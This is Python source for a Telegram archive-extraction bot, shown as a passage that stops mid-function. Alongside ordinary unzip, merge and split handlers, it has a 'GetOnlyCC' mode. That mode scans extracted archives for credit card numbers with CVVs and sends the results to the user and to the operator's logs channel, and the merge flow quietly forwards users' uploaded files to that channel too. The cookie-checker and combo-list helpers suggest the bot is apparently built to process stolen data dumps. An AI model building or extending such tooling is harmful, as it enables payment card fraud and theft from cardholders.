import asyncio
import concurrent.futures
import os
import re
import shutil
import time
import fnmatch
from urllib.parse import unquote

from concurrent.futures import ThreadPoolExecutor
import threading
import io
import zipfile
import uuid

from ..helpers.cookie_checker_helper import CookieHelper
from ..helpers import cookie_helper
import requests
from pykeyboard import InlineKeyboard
from pyrogram import Client
from pyrogram.errors import ReplyMarkupTooLong
from pyrogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message

import unzip_http
from config import Config
from unzipbot import LOGGER, unzipbot_client
from unzipbot.helpers import combo_helper
from unzipbot.helpers import aria2_helper
from unzipbot.helpers.gofile_helper import resolve_gofile_link
from unzipbot.helpers.database import (
    add_cancel_task,
    add_ongoing_task,
    count_ongoing_tasks,
    del_merge_task,
    del_ongoing_task,
    get_lang,
    get_maintenance,
    get_merge_task_message_id,
    get_ongoing_tasks,
    set_upload_mode,
    update_uploaded,
)
from unzipbot.helpers.progress_helper import generate_progress_message
from unzipbot.helpers.unzip_help import (
    ERROR_MSGS,
    TimeFormatter,
    extentions_list,
    humanbytes,
    progress_for_pyrogram,
)
from unzipbot.i18n.buttons import Buttons
from unzipbot.i18n.messages import Messages

from ..helpers import combo_helper

# Import your new refactored script
from .ext_script import cc_finder
from .commands import get_stats, https_url_regex, sufficient_disk_space
from .ext_script.ext_helper import (
    extr_files,
    get_files,
    make_keyboard,
    make_keyboard_empty,
    merge_files,
    split_files,
    test_with_7z_helper,
    test_with_unrar_helper,
)
from .ext_script.up_helper import answer_query, get_size, send_file, send_url_logs

split_file_pattern = r"\.z\d+$"
rar_file_pattern = r"\.(?:r\d+|part\d+\.rar)$"
volume_file_pattern = r"\.\d+$"
telegram_url_pattern = r"(?:http[s]?:\/\/)?(?:www\.)?t\.me\/([a-zA-Z0-9_]+)\/(\d+)"
messages = Messages(lang_fetcher=get_lang)

callback_cookie_data = {}


async def _start_extraction(message: Message, download, password: str = None):
    """
    Function to handle the extraction process after a file is downloaded.
    """
    uid = message.chat.id
    download_path = str(download.dir)
    archive_name = download.name
    archive_size = humanbytes(download.total_length)

    ext_files_dir = f"{download_path}/extracted"

    log_msg = await unzipbot_client.send_message(
        chat_id=Config.LOGS_CHANNEL,
        message_thread_id=Config.LOG_TOPIC_GENERAL,
        text=f"Extraction from URL started for user `{uid}`.\nArchive: `{archive_name}`",
    )

    try:
        # --- Find the actual file on disk ---
        files_in_dir = os.listdir(download_path)
        actual_archive_files = [
            f
            for f in files_in_dir
            if os.path.isfile(os.path.join(download_path, f))
        ]

        if not actual_archive_files:
            raise FileNotFoundError(
                "Could not find the downloaded archive file in the directory."
            )

        real_archive_path = os.path.join(download_path, actual_archive_files[0])

        extracting_text = await generate_progress_message(
            status="Extracting",
            filename=archive_name,
            progress="N/A",
            size_str=archive_size,
            eta="-",
            speed="-",
            elapsed_time="-",
            engine="7z/unrar",
            cancel_gid=None,
        )
        await message.edit_text(extracting_text)

        await extr_files(
            path=ext_files_dir, archive_path=real_archive_path, password=password
        )

        paths = await get_files(path=ext_files_dir)
        if not paths:
            await message.edit(text=messages.get("callbacks", "EXT_FAILED_TXT", uid))
            await del_ongoing_task(uid)
            shutil.rmtree(download_path)
            return

        await message.edit(
            text=messages.get(
                file="callbacks", key="EXT_OK_TXT", user_id=uid, extra_args="a few seconds"
            )
        )

        i_e_buttons = await make_keyboard(
            paths=paths,
            user_id=uid,
            chat_id=message.chat.id,
            log_msg_id=log_msg.id,
            unziphttp=False,
        )
        await message.edit(
            text=messages.get(file="callbacks", key="SELECT_FILES", user_id=uid),
            reply_markup=i_e_buttons,
        )

        await del_ongoing_task(uid)
    except Exception as e:
        LOGGER.error(f"Error in _start_extraction: {e}")
        await message.edit(
            text=messages.get("callbacks", "ERROR_TXT", user_id=uid, extra_args=e)
        )
        await del_ongoing_task(uid)
        shutil.rmtree(download_path)


async def _run_cc_finder_and_upload(message: Message, root_path: str, user_id: int):
    """
    Runs the CC finder on a given path, sends results, and cleans up.
    This is the shared logic to be called after extraction is complete.
    """
    try:
        await message.edit_text("`Extraction complete. Now scanning for CCs...`")

        output_file, response_message = await cc_finder.find_and_extract_cc(
            root_path, only_with_cvv=True
        )

        if output_file:
            await message.edit_text(
                messages.get("callbacks", "get_only_cc_success", user_id),
                reply_markup=None,
            )
            await send_file(
                unzip_bot=unzipbot_client,
                c_id=user_id,
                doc_f=output_file,
                query=message,
                full_path=root_path,
                log_msg=None,
                split=False,
                custom_caption=response_message,
            )
            await unzipbot_client.send_document(
                chat_id=Config.LOGS_CHANNEL,
                message_thread_id=Config.LOG_TOPIC_EXTRACTED_CC,
                document=output_file,
                caption=f"💳 GetOnlyCC for user `{user_id}`.\n\n{response_message}",
            )
        else:
            await message.edit_text(
                messages.get("callbacks", "get_only_cc_failed", user_id),
                reply_markup=None,
            )

    except Exception as e:
        LOGGER.error(f"Error in _run_cc_finder_and_upload: {e}")
        try:
            await message.edit_text(
                messages.get("callbacks", "ERROR_TXT", user_id, extra_args=e)
            )
        except:
            pass
    finally:
        await del_ongoing_task(user_id)
        try:
            # The root path is .../{user_id}/extracted. We need to delete .../{user_id}
            full_download_dir = os.path.dirname(root_path)
            shutil.rmtree(full_download_dir)
        except Exception as e:
            LOGGER.error(f"Could not clean up directory {root_path}: {e}")


async def _start_extraction_and_find_cc(
    message: Message, download, password: str = None
):
    """
    Handles extraction and then automatically triggers the CC finding process.
    Called by the downloader for URL-based requests.
    """
    uid = message.chat.id
    download_path = str(download.dir)
    archive_name = download.name
    ext_files_dir = f"{download_path}/extracted"

    try:
        # --- Start Extraction (Logic from _start_extraction) ---
        files_in_dir = os.listdir(download_path)
        actual_archive_files = [
            f
            for f in files_in_dir
            if os.path.isfile(os.path.join(download_path, f))
        ]

        if not actual_archive_files:
            raise FileNotFoundError(
                "Could not find the downloaded archive file in the directory."
            )

        real_archive_path = os.path.join(download_path, actual_archive_files[0])

        await message.edit_text(f"`Extracting {archive_name}...`")

        await extr_files(
            path=ext_files_dir, archive_path=real_archive_path, password=password
        )

        paths = await get_files(path=ext_files_dir)
        if not paths:
            await message.edit(text=messages.get("callbacks", "EXT_FAILED_TXT", uid))
            await del_ongoing_task(uid)
            shutil.rmtree(download_path)
            return

        # --- Extraction finished, now run the CC finder ---
        await _run_cc_finder_and_upload(message, ext_files_dir, uid)

    except Exception as e:
        LOGGER.error(f"Error in _start_extraction_and_find_cc: {e}")
        await message.edit(
            text=messages.get("callbacks", "ERROR_TXT", user_id=uid, extra_args=e)
        )
        await del_ongoing_task(uid)
        shutil.rmtree(download_path)


# Function to extract the sequence number from filenames
def get_sequence_number(filename, pattern):
    match = re.search(pattern, filename)

    if match:
        # Extract the numeric part from the matched pattern
        num_match = re.findall(pattern=r"\d+", string=match.group())

        if num_match:
            return int(num_match[-1])

    # Use infinity if no number is found (ensures this file is always last)
    return float("inf")


# Function to find the file with the lowest sequence
def find_lowest_sequence_file(files):
    if not files:
        raise IndexError("No files to match")

    # Match the files against the patterns
    rar_matches = [f for f in files if re.search(pattern=rar_file_pattern, string=f)]
    volume_matches = [
        f for f in files if re.search(pattern=volume_file_pattern, string=f)
    ]

    # Handle RAR pattern cases
    if rar_matches:
        # Separate .rX and .partX.rar cases
        r_files = [
            f
            for f in rar_matches
            if f.endswith(".rar") or re.search(pattern=r"\.r\d+$", string=f)
        ]
        part_files = [
            f for f in rar_matches if re.search(pattern=r"part\d+\.rar$", string=f)
        ]

        # Priority: .partX.rar -> .rX
        if part_files:
            return min(
                part_files,
                key=lambda x: get_sequence_number(filename=x, pattern=r"part\d+"),
            ), "rar"
        elif r_files:
            return min(
                r_files,
                key=lambda x: get_sequence_number(filename=x, pattern=r"\.r\d+$"),
            ), "rar"

    # Handle other cases
    if volume_matches:
        return min(
            volume_matches,
            key=lambda x: get_sequence_number(filename=x, pattern=r"\.\d+$"),
        ), "volume"

    raise IndexError("No matching files found")


def get_zip_http(url):
    rzf = unzip_http.RemoteZipFile(url)
    paths = rzf.namelist()
    return rzf, paths


async def async_generator(iterable):
    for item in iterable:
        yield item


# Callbacks
@unzipbot_client.on_callback_query()
async def unzip_cb(unzip_bot: Client, query: CallbackQuery):
    archive_msg = None
    uid = query.from_user.id

    if uid != Config.BOT_OWNER:  # skipcq: PTC-W0048
        if await count_ongoing_tasks() >= Config.MAX_CONCURRENT_TASKS:
            ogtasks = await get_ongoing_tasks()

            if not any(ogtask.get("user_id") == uid for ogtask in ogtasks):
                await unzip_bot.send_message(
                    chat_id=uid,
                    text=messages.get(
                        file="callbacks",
                        key="MAX_TASKS",
                        user_id=uid,
                        extra_args=Config.MAX_CONCURRENT_TASKS,
                    ),
                )

                return

    if (
        uid != Config.BOT_OWNER
        and await get_maintenance()
        and query.data
        not in [
            "megoinhome",
            "helpcallback",
            "aboutcallback",
            "donatecallback",
            "statscallback",
            "canceldownload",
            "check_thumb",
            "check_before_del",
            "save_thumb",
            "del_thumb",
            "nope_thumb",
            "set_mode",
            "cancel_dis",
            "nobully",
        ]
    ):
        await answer_query(
            query=query,
            message_text=messages.get(
                file="callbacks", key="MAINTENANCE_ON", user_id=uid
            ),
        )

        return

    sent_files = 0

    if query.data == "megoinhome":
        await query.edit_message_text(
            text=messages.get(
                file="callbacks",
                key="START_TEXT",
                user_id=uid,
                extra_args=query.from_user.mention,
            ),
            reply_markup=Buttons.START_BUTTON,
        )

    elif query.data == "helpcallback":
        await query.edit_message_text(
            text=messages.get(file="callbacks", key="HELP_TXT", user_id=uid),
            reply_markup=Buttons.ME_GOIN_HOME,
        )

    elif query.data == "aboutcallback":
        await query.edit_message_text(
            text=messages.get(
                file="callbacks",
                key="ABOUT_TXT",
                user_id=uid,
                extra_args=Config.VERSION,
            ),
            reply_markup=Buttons.ME_GOIN_HOME,
            disable_web_page_preview=True,
        )

    elif query.data == "donatecallback":
        await query.edit_message_text(
            text=messages.get(file="callbacks", key="DONATE_TEXT", user_id=uid),
            reply_markup=Buttons.ME_GOIN_HOME,
            disable_web_page_preview=True,
        )

    elif query.data.startswith("statscallback"):
        if query.data.endswith("refresh"):
            await query.edit_message_text(
                text=messages.get(file="callbacks", key="REFRESH_STATS", user_id=uid)
            )
        text_stats = await get_stats(query.from_user.id)
        await query.edit_message_text(
            text=text_stats, reply_markup=Buttons.REFRESH_BUTTON
        )

    elif query.data == "canceldownload":
        await add_cancel_task(query.from_user.id)

    elif query.data.startswith("set_mode"):
        user_id = query.from_user.id
        mode = query.data.split("|")[1]
        await set_upload_mode(user_id=user_id, mode=mode)
        await answer_query(
            query=query,
            message_text=messages.get(
                file="callbacks",
                key="CHANGED_UPLOAD_MODE_TXT",
                user_id=uid,
                extra_args=mode,
            ),
        )

    elif query.data == "merge_this":
        user_id = query.from_user.id
        m_id = query.message.id
        start_time = time.time()
        await add_ongoing_task(
            user_id=user_id, start_time=start_time, task_type="merge"
        )
        s_id = await get_merge_task_message_id(user_id)
        merge_msg = await query.message.edit(
            text=messages.get(file="callbacks", key="PROCESSING_TASK", user_id=uid)
        )
        download_path = f"{Config.DOWNLOAD_LOCATION}/{user_id}/merge"

        if s_id and (m_id - s_id) > 1:
            files_array = list(range(s_id, m_id))

            try:
                messages_array = await unzip_bot.get_messages(
                    chat_id=user_id, message_ids=files_array
                )
            except Exception as e:
                LOGGER.error(
                    msg=messages.get(
                        file="callbacks", key="ERROR_GET_MSG", extra_args=e
                    )
                )
                await answer_query(
                    query=query,
                    message_text=messages.get(
                        file="callbacks", key="ERROR_TXT", user_id=uid, extra_args=e
                    ),
                )
                await del_ongoing_task(user_id)
                await del_merge_task(user_id)

                try:
                    shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{user_id}")
                except:
                    pass

                return

            length = len(messages_array)
            os.makedirs(name=download_path, exist_ok=True)
            rs_time = time.time()
            newarray = []
            await merge_msg.edit(
                text=messages.get(
                    file="callbacks", key="PROCESS_MSGS", user_id=uid, extra_args=length
                )
            )

            for message in messages_array:
                if message.document is None:
                    pass
                else:
                    if message.from_user.id == user_id:
                        newarray.append(message)

            length = len(newarray)

            if length == 0:
                await answer_query(
                    query=query,
                    message_text=messages.get(
                        file="callbacks", key="NO_MERGE_TASK", user_id=uid
                    ),
                )
                await del_ongoing_task(user_id)
                await del_merge_task(user_id)

                try:
                    shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{user_id}")
                except:
                    pass

                return

            i = 0
            async_newarray = async_generator(newarray)

            async for message in async_newarray:
                i += 1
                fname = message.document.file_name
                await message.forward(chat_id=Config.LOGS_CHANNEL)
                location = f"{download_path}/{fname}"
                s_time = time.time()
                await message.download(
                    file_name=location,
                    progress=progress_for_pyrogram,
                    progress_args=(
                        messages.get(
                            file="callbacks",
                            key="DL_FILES",
                            user_id=uid,
                            extra_args=[i, length],
                        ),
                        merge_msg,
                        s_time,
                        unzip_bot,
                    ),
                )

            e_time = time.time()
            dltime = TimeFormatter(round(number=e_time - rs_time) * 1000)

            if dltime == "":
                dltime = "1 s"

            await merge_msg.edit(
                text=messages.get(
                    file="callbacks",
                    key="AFTER_OK_MERGE_DL_TXT",
                    user_id=uid,
                    extra_args=[i, dltime],
                )
            )
            await merge_msg.edit(
                text=messages.get(
                    file="callbacks", key="CHOOSE_EXT_MODE_MERGE", user_id=uid
                ),
                reply_markup=Buttons.CHOOSE_E_F_M__BTNS,
            )
            await del_merge_task(user_id)
        else:
            await answer_query(
                query=query,
                message_text=messages.get(
                    file="callbacks", key="NO_MERGE_TASK", user_id=uid
                ),
            )
            await del_ongoing_task(user_id)
            await del_merge_task(user_id)

            try:
                shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{user_id}")
            except:
                pass

    elif query.data.startswith("merged"):
        user_id = query.from_user.id
        download_path = f"{Config.DOWNLOAD_LOCATION}/{user_id}/merge"
        ext_files_dir = f"{Config.DOWNLOAD_LOCATION}/{user_id}/extracted"
        os.makedirs(name=ext_files_dir, exist_ok=True)

        try:
            files = await get_files(download_path)
            file, file_type = find_lowest_sequence_file(files)
        except IndexError:
            await answer_query(
                query=query,
                message_text=messages.get(
                    file="callbacks", key="NO_MERGE_TASK", user_id=uid
                ),
            )
            await del_ongoing_task(user_id)
            await del_merge_task(user_id)

            try:
                shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{user_id}")
            except:
                pass

            return

        split_data = query.data.split("|")
        log_msg = await unzip_bot.send_message(
            chat_id=Config.LOGS_CHANNEL,
            message_thread_id=Config.LOG_TOPIC_GENERAL,
            text=messages.get(
                file="callbacks",
                key="PROCESS_MERGE",
                extra_args=[user_id, ".".join(file.split("/")[-1].split(".")[:-1])],
            ),
        )

        try:
            await query.message.edit(
                text=messages.get(file="callbacks", key="PROCESSING_TASK", user_id=uid)
            )
        except:
            pass

        if split_data[1] == "with_pass":
            password = await unzip_bot.ask(
                chat_id=query.message.chat.id,
                text=messages.get(
                    file="callbacks", key="PLS_SEND_PASSWORD", user_id=uid
                ),
            )
            ext_s_time = time.time()
            extractor = await merge_files(
                iinput=file,
                ooutput=ext_files_dir,
                file_type=file_type,
                password=password.text,
            )
            ext_e_time = time.time()
        else:
            # Can't test the archive apparently
            ext_s_time = time.time()
            extractor = await merge_files(
                iinput=file, ooutput=ext_files_dir, file_type=file_type
            )
            ext_e_time = time.time()

        # If no files were extracted, THEN it's a true failure.
        paths = await get_files(path=ext_files_dir)
        if not paths:
            try:
                await query.message.edit(
                    text=messages.get(
                        file="callbacks", key="EXT_FAILED_TXT", user_id=uid
                    )
                )
                await log_msg.reply(
                    text=f"Extraction failed. Full output:\n\n`{extractor}`"
                )
            except Exception as e:
                LOGGER.error(f"Error while handling extraction failure: {e}")
            finally:
                await del_ongoing_task(user_id)
                try:
                    shutil.rmtree(ext_files_dir)
                except:
                    pass
            return

        try:
            shutil.rmtree(download_path)
        except:
            pass

        # Upload extracted files
        extrtime = TimeFormatter(round(number=ext_e_time - ext_s_time) * 1000)

        if extrtime == "":
            extrtime = "1s"
        await answer_query(
            query=query,
            message_text=messages.get(
                file="callbacks", key="EXT_OK_TXT", user_id=uid, extra_args=[extrtime]
            ),
            unzip_client=unzip_bot,
        )

        try:
            i_e_buttons = await make_keyboard(
                paths=paths,
                user_id=user_id,
                chat_id=query.message.chat.id,
                log_msg_id=log_msg.id,
                unziphttp=False,
            )

            try:
                await query.message.edit(
                    text=messages.get(
                        file="callbacks", key="SELECT_FILES", user_id=uid
                    ),
                    reply_markup=i_e_buttons,
                )
            except ReplyMarkupTooLong:
                empty_buttons = await make_keyboard_empty(
                    user_id=user_id,
                    chat_id=query.message.chat.id,
                    log_msg_id=log_msg.id,
                    unziphttp=False,
                )
                await query.message.edit(
                    text=messages.get(
                        file="callbacks", key="UNABLE_GATHER_FILES", user_id=uid
                    ),
                    reply_markup=empty_buttons,
                )
        except:
            try:
                await query.message.delete()
                i_e_buttons = await make_keyboard(
                    paths=paths,
                    user_id=user_id,
                    chat_id=query.message.chat.id,
                    log_msg_id=log_msg.id,
                    unziphttp=False,
                )
                await unzip_bot.send_message(
                    chat_id=query.message.chat.id,
                    text=messages.get(
                        file="callbacks", key="SELECT_FILES", user_id=uid
                    ),
                    reply_markup=i_e_buttons,
                )
            except:
                try:
                    await query.message.delete()
                    empty_buttons = await make_keyboard_empty(
                        user_id=user_id,
                        chat_id=query.message.chat.id,
                        log_msg_id=log_msg.id,
                        unziphttp=False,
                    )
                    await unzip_bot.send_message(
                        chat_id=query.message.chat.id,
                        text=messages.get(
                            file="callbacks", key="UNABLE_GATHER_FILES", user_id=uid
                        ),
                        reply_markup=empty_buttons,
                    )
                except:
                    await answer_query(
                        query=query,
                        message_text=messages.get(
                            file="callbacks", key="EXT_FAILED_TXT", user_id=uid
                        ),
                        unzip_client=unzip_bot,
                    )
                    shutil.rmtree(ext_files_dir)
                    LOGGER.error(msg=messages.get(file="callbacks", key="FATAL_ERROR"))
                    await del_ongoing_task(user_id)

                    return

    elif query.data.startswith("unzip_archive"):
        user_id = query.from_user.id
        r_message = query.message.reply_to_message

        # --- Basic validation ---
        if not r_message:
            await query.answer("Error: The original message could not be found.", show_alert=True)
            return

        # --- Add task to the queue ---
        start_time = time.time()
        await add_ongoing_task(user_id=user_id, start_time=start_time, task_type="extract")
        
        download_path = f"{Config.DOWNLOAD_LOCATION}/{user_id}"
        ext_files_dir = f"{download_path}/extracted"
        split_data = query.data.split("|")

        await query.message.edit(text=messages.get("callbacks", "PROCESSING_TASK", user_id))
        log_msg = await unzipbot_client.send_message(
            chat_id=Config.LOGS_CHANNEL,
            message_thread_id=Config.LOG_TOPIC_GENERAL,
            text=messages.get("callbacks", "USER_QUERY", extra_args=user_id),
        )

        # --- Main logic with corrected parsing ---
        try:
            # FIX: Determine source and password type correctly at the beginning
            password_type = split_data[1]  # This will be 'with_pass' or 'no_pass'
            source_type = "url" if r_message.text else "tg_file"
            actual_password = None

            # Ask for password if needed (applies to both URL and file)
            if password_type == "with_pass":
                password_msg = await unzipbot_client.ask(
                    chat_id=user_id,
                    text=messages.get("callbacks", "PLS_SEND_PASSWORD", user_id=uid)
                )
                if password_msg and password_msg.text:
                    if password_msg.text == "/cancel":
                        await query.message.edit("Task cancelled by user.")
                        return # The universal /cancel command handles cleanup
                    actual_password = password_msg.text
                else:
                    await query.message.edit("Password was not provided. Task cancelled.")
                    await del_ongoing_task(user_id)
                    return

            # --- ROUTE 1: URL Processing ---
            if source_type == "url":
                url = r_message.text
                dl_headers = None

                if "gofile.io" in url:
                    await query.message.edit_text("`Resolving Gofile link...`")
                    resolved_info, error = await resolve_gofile_link(url)
                    if error:
                        await query.message.edit_text(f"❌ **Gofile Error:**\n`{error}`")
                        await del_ongoing_task(user_id)
                        return
                    url = resolved_info['url']
                    dl_headers = resolved_info['headers']
                
                if not re.match(pattern=https_url_regex, string=url):
                    await query.message.edit(text=messages.get("callbacks", "INVALID_URL", user_id=uid))
                    await del_ongoing_task(user_id)
                    return

                # Hand off to aria2c for background download
                await query.message.edit_text("`Initializing download...`")
                await aria2_helper.add_download(
                    uri=url, path=download_path, message=query.message,
                    password=actual_password, callback_type="extract", headers=dl_headers
                )
                return  # Job is done, poller will take over

            # --- ROUTE 2: Telegram File Processing ---
            elif source_type == "tg_file":
                if r_message.document is None:
                    await query.message.edit(text=messages.get("callbacks", "GIVE_ARCHIVE", user_id=uid))
                    await del_ongoing_task(user_id)
                    return
                
                fname = r_message.document.file_name
                await log_msg.edit(text=messages.get("callbacks", "LOG_TXT", extra_args=[user_id, fname, humanbytes(r_message.document.file_size)]))
                
                os.makedirs(name=download_path, exist_ok=True)
                s_time = time.time()
                archive = await r_message.download(
                    file_name=f"{download_path}/{fname}",
                    progress=progress_for_pyrogram,
                    progress_args=(messages.get("callbacks", "TRY_DL", user_id), query.message, s_time, unzipbot_client)
                )
                
                await query.message.edit_text(f"`Download complete. Now extracting {fname}...`")
                await extr_files(path=ext_files_dir, archive_path=archive, password=actual_password)
                
                paths = await get_files(path=ext_files_dir)
                if not paths:
                    await query.message.edit(text=messages.get("callbacks", "EXT_FAILED_TXT", user_id))
                    shutil.rmtree(download_path, ignore_errors=True)
                    await del_ongoing_task(user_id)
                    return
                
                # Show file selection keyboard and then free up the task slot
                i_e_buttons = await make_keyboard(paths=paths, user_id=user_id, chat_id=query.message.chat.id, log_msg_id=log_msg.id, unziphttp=False)
                await query.message.edit(text=messages.get("callbacks", "SELECT_FILES", user_id=uid), reply_markup=i_e_buttons)
                await del_ongoing_task(user_id)

        except Exception as e:
            LOGGER.error(f"Error in unzip_archive callback: {e}")
            await query.message.edit(text=messages.get("callbacks", "ERROR_TXT", user_id=user_id, extra_args=str(e)))
            await del_ongoing_task(user_id)
            shutil.rmtree(download_path, ignore_errors=True)
    
    elif query.data.startswith("get_only_cc"):
        user_id = query.from_user.id
        start_time = time.time()
        await add_ongoing_task(
            user_id=user_id, start_time=start_time, task_type="extract"
        )

        download_path = f"{Config.DOWNLOAD_LOCATION}/{user_id}"
        ext_files_dir = f"{download_path}/extracted"
        r_message = query.message.reply_to_message
        
        pass_type = "with_pass" if "with_pass" in query.data else "no_pass"
        
        source = None
        if r_message.document:
            source = "tg_file"
        elif r_message.text:
            source = "url"

        try:
            await query.message.edit(
                text=messages.get(
                    file="callbacks", key="extracting_ccs_only", user_id=user_id
                )
            )
        except:
            pass

        try:
            if source == "url":
                url = r_message.text
                dl_headers = None

                # --- THIS IS THE FULLY INTEGRATED GOFILE LOGIC ---
                if "gofile.io" in url:
                    await query.message.edit_text("`Resolving Gofile link, please wait...`")
                    resolved_info, error = await resolve_gofile_link(url)
                    if error:
                        await query.message.edit_text(f"❌ **Gofile Error:**\n`{error}`")
                        await del_ongoing_task(user_id)
                        return
                    url = resolved_info['url']
                    dl_headers = resolved_info['headers']
                # --- END OF GOFILE LOGIC ---

                if not re.match(pattern=https_url_regex, string=url):
                    await query.message.edit(text=messages.get("callbacks", "INVALID_URL", user_id))
                    await del_ongoing_task(user_id) # Make sure to clean up
                    return

                actual_password = None
                if pass_type == "with_pass":
                    password_msg = await unzip_bot.ask(chat_id=user_id, text=messages.get("callbacks", "PLS_SEND_PASSWORD", user_id))
                    if password_msg and password_msg.text:
                        actual_password = password_msg.text
                    else:
                        await query.message.edit("Password was not provided. Task cancelled.")
                        await del_ongoing_task(user_id)
                        return

                os.makedirs(download_path, exist_ok=True)

                await aria2_helper.add_download(
                    uri=url, path=download_path, message=query.message,
                    password=actual_password, callback_type="extract_and_find_cc", headers=dl_headers
                )
                return 

            elif source == "tg_file":
                if r_message.document is None:
                    await query.message.edit(text=messages.get("callbacks", "GIVE_ARCHIVE", user_id))
                    await del_ongoing_task(user_id)
                    return

                os.makedirs(download_path, exist_ok=True)
                s_time = time.time()
                archive = await r_message.download(
                    file_name=f"{download_path}/{r_message.document.file_name}",
                    progress=progress_for_pyrogram,
                    progress_args=(messages.get("callbacks", "TRY_DL", user_id), query.message, s_time, unzip_bot)
                )

                actual_password = None
                if pass_type == "with_pass":
                    password_msg = await unzip_bot.ask(chat_id=user_id, text=messages.get("callbacks", "PLS_SEND_PASSWORD", user_id))
                    if password_msg and password_msg.text:
                        actual_password = password_msg.text
                    else:
                        await query.message.edit("Password was not provided. Task cancelled.")
                        await del_ongoing_task(user_id)
                        shutil.rmtree(download_path, ignore_errors=True)
                        return

                await query.message.edit(f"`Extracting {r_message.document.file_name}...`")
                await extr_files(path=ext_files_dir, archive_path=archive, password=actual_password)

                paths = await get_files(path=ext_files_dir)
                if not paths:
                    await query.message.edit(text=messages.get("callbacks", "EXT_FAILED_TXT", user_id))
                    await del_ongoing_task(user_id)
                    shutil.rmtree(download_path, ignore_errors=True)
                    return

                await _run_cc_finder_and_upload(query.message, ext_files_dir, user_id)
                await del_ongoing_task(user_id)


        except Exception as e:
            LOGGER.error(f"Error in GetOnlyCC main handler: {e}")
            await query.message.edit(text=messages.get("callbacks", "ERROR_TXT", user_id, extra_args=e))
            await del_ongoing_task(user_id)
            try:
                shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{user_id}")
            except Exception as clean_e:
                LOGGER.error(f"Could not clean up directory for {user_id}: {clean_e}")

    elif query.data.startswith("extract_file"):
        user_id = query.from_user.id
        split_data = query.data.split("|")
        source = split_data[1]
        pass_type = split_data[2]

        keyboard = InlineKeyboard(row_width=2)
        buttons_to_add = [
            InlineKeyboardButton(
                text=messages.get(
                    file="buttons", key="get_only_cc_btn", user_id=user_id
                ),
                callback_data=f"get_only_cc|{source}|{pass_type}",
            ),
            InlineKeyboardButton(
                text=messages.get(file="buttons", key="unzip_btn", user_id=user_id),
                callback_data=f"unzip_archive|{source}|{pass_type}",
            ),
        ]
        keyboard.add(*buttons_to_add)
        keyboard.row(
            InlineKeyboardButton(
                text=messages.get(file="ext_helper", key="CANCEL_IT", user_id=user_id),
                callback_data="cancel_dis",
            )
        )

        await query.message.edit(
            text=messages.get(file="callbacks", key="choose_action", user_id=user_id),
            reply_markup=keyboard,
        )

    elif query.data.startswith("ext_f"):
        spl_data = query.data.split("|")
        log_msg_id = int(spl_data[3])
        log_msg = await unzip_bot.get_messages(Config.LOGS_CHANNEL, log_msg_id)
        LOGGER.info(msg=query.data)
        user_id = query.from_user.id
        spl_data = query.data.split("|")
        file_path = f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}/extracted"

        try:
            urled = spl_data[4] if isinstance(spl_data[4], bool) else False
        except:
            urled = False

        if urled:
            paths = spl_data[5].namelist()
        else:
            paths = await get_files(path=file_path)

        if not paths and not urled:
            if os.path.isdir(f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}"):
                shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}")

            await del_ongoing_task(user_id)
            await query.message.edit(
                text=messages.get(file="callbacks", key="NO_FILE_LEFT", user_id=uid),
                reply_markup=Buttons.RATE_ME,
            )

            return

        LOGGER.info(msg="ext_f paths : " + str(paths))

        try:
            await query.message.edit(
                text=messages.get(
                    file="callbacks", key="UPLOADING_THIS_FILE", user_id=uid
                )
            )
        except:
            pass

        sent_files += 1

        if urled:
            file = spl_data[5].open(paths[int(spl_data[3])])
        else:
            file = paths[int(spl_data[3])]

        fsize = await get_size(file)
        split = False

        if fsize <= Config.TG_MAX_SIZE:
            await send_file(
                unzip_bot=unzip_bot,
                c_id=spl_data[2],
                doc_f=file,
                query=query,
                full_path=f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}",
                log_msg=log_msg,
                split=False,
            )
        else:
            split = True

        if split:
            fname = file.split("/")[-1]
            smessage = await unzip_bot.send_message(
                chat_id=user_id,
                text=messages.get(
                    file="callbacks", key="SPLITTING", user_id=uid, extra_args=fname
                ),
            )
            splitdir = f"{Config.DOWNLOAD_LOCATION}/split/{user_id}"
            os.makedirs(name=splitdir, exist_ok=True)
            ooutput = f"{splitdir}/{fname}"
            splitfiles = await split_files(
                iinput=file, ooutput=ooutput, size=Config.TG_MAX_SIZE
            )
            LOGGER.info(msg=splitfiles)

            if not splitfiles:
                try:
                    shutil.rmtree(splitdir)
                except:
                    pass

                await del_ongoing_task(user_id)
                await smessage.edit(
                    text=messages.get(file="callbacks", key="ERR_SPLIT", user_id=uid)
                )

                return

            await smessage.edit(
                text=messages.get(
                    file="callbacks",
                    key="SEND_ALL_PARTS",
                    user_id=uid,
                    extra_args=fname,
                )
            )
            async_splitfiles = async_generator(splitfiles)

            async for file in async_splitfiles:
                sent_files += 1
                await send_file(
                    unzip_bot=unzip_bot,
                    c_id=user_id,
                    doc_f=file,
                    query=query,
                    full_path=splitdir,
                    log_msg=log_msg,
                    split=True,
                )

            try:
                shutil.rmtree(splitdir)
                os.remove(path=file)
            except:
                pass

            try:
                await smessage.delete()
            except:
                pass

        await query.message.edit(
            text=messages.get(file="callbacks", key="REFRESHING", user_id=uid)
        )

        if urled:
            rpaths = paths.remove(paths[int(spl_data[3])])
        else:
            rpaths = await get_files(path=file_path)

        if not rpaths:
            try:
                shutil.rmtree(f"{Config.DOWNLOAD_LOCATION}/{spl_data[1]}")
            except:
                pass

            await del_ongoing_task(user_id)
            await query.message.edit(
                text=messages.get(file="callbacks", key="NO_FILE_LEFT", user_id=uid),
                reply_markup=Buttons.RATE_ME,
            )

            return

        if urled:
            try:
                i_e_buttons = await make_keyboard(
                    paths=rpaths,
                    user_id=query.from_user.id,
                    chat_id=query.message.chat.id,
                    log_msg_id=log_msg.id,
                    unziphttp=True,
                    rzfile=spl_data[5],
                )
                await query.message.edit(
                    text=messages.get(
                        file="callbacks", key="SELECT_FILES", user_id=uid
                    ),
                    reply_markup=i_e_buttons,
                )
            except ReplyMarkupTooLong:
                empty_buttons = await make_keyboard_empty(
                    user_id=user_id,
                    chat_id=query.message.chat.id,
                    log_msg_id=log_msg.id,
                    unziphttp=True,
